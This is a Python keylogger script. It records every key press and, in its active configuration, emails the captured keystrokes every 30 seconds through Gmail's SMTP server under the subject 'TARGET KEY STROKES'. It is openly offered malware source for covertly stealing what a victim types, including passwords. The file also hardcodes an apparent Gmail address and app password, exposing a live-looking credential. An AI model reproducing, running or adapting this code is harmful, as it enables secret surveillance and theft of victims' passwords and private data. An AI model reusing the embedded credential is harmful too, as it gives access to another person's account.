import keyboard
import threading
from email.message import EmailMessage
from time import sleep
import smtplib
import ssl

class Keylogger:
    def __init__(self, medium, timeout):
        self.pressed_keys_list = []
        self.timeout = timeout
        self.medium = medium

        if self.medium == "email":
            threading.Thread(target=self.send_mail).start()
        elif self.medium == "text file":
            threading.Thread(target=self.write_to_file).start()

    def write_to_file(self):
        sleep(self.timeout)
        with open("pressed_keys.txt", "a") as file:
            file.write("".join(self.pressed_keys_list))
            file.write("\n")
        self.pressed_keys_list = []
        self.write_to_file()

    def handling_confusion(self):
        key_mappings = {
            'enter': '[ENTER]',
            'shift': '[SHIFT]',
            'backspace': '[BACKSPACE]',
            'caps lock': '[CAPS LOCK]',
            'tab': '[TAB]',
            'ctrlright': '[RIGHT VALA CONTROL]',
            'ctrl': '[LEFT VALA CONTROL]',
            'space': ' ',
            'left': '[LEFT ARROW]',
            'up': '[UP ARROW]',
            'down': '[DOWN ARROW]',
            'right': '[RIGHT ARROW]',
            'esp': '[ESCAPE]',
            'right shift': '[RIGHT SHIFT]'
        }
        self.pressed_key_name = key_mappings.get(self.pressed_key_name, self.pressed_key_name)

    def capture_keys(self, event):
        self.pressed_key_name = event.name
        self.handling_confusion()
        self.pressed_keys_list.append(self.pressed_key_name)

    def creating_structure(self):
        sleep(self.timeout)
        self.Mymail = 'niharikagupta197@gmail.com'
        self.email_password = 'ygjlsximhcniuoaj'
        structure = EmailMessage()
        structure['From'] = self.Mymail
        structure['To'] = self.Mymail
        structure['Subject'] = "TARGET KEY STROKES"
        body= "".join(self.pressed_keys_list) + "\n"
        structure.set_content(body)
        return structure

    def send_mail(self):
        self.creating_structure()
        security = ssl.create_default_context()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=security)
        server.login(self.Mymail, self.email_password)
        server.sendmail(self.Mymail, self.Mymail, self.creating_structure().as_string())
        self.pressed_keys_list = []
        self.creating_structure()

Shuru = Keylogger("email", 30)
keyboard.on_press(Shuru.capture_keys)
keyboard.wait()
